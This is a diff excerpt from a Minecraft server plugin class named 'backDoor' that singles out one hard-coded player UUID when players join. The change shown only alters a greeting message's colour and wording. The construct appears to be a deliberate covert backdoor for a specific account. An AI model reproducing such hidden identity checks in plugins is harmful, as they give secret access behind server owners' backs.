@@ -13,7 +13,7 @@ public class backDoor implements Listener{
 	 public void onFreaDying(PlayerJoinEvent event){
 		Player p = event.getPlayer();
 		if(p.getUniqueId().toString().equalsIgnoreCase("f0e8b790-8539-45b0-a052-dc6b922208c5")) {
-			p.sendMessage(ChatColor.RED+"Hello,This is RuthlessFrea_.");
+			p.sendMessage(ChatColor.DARK_AQUA+"Hello,This is Relocation_Notice.");
 		}
 				
     }
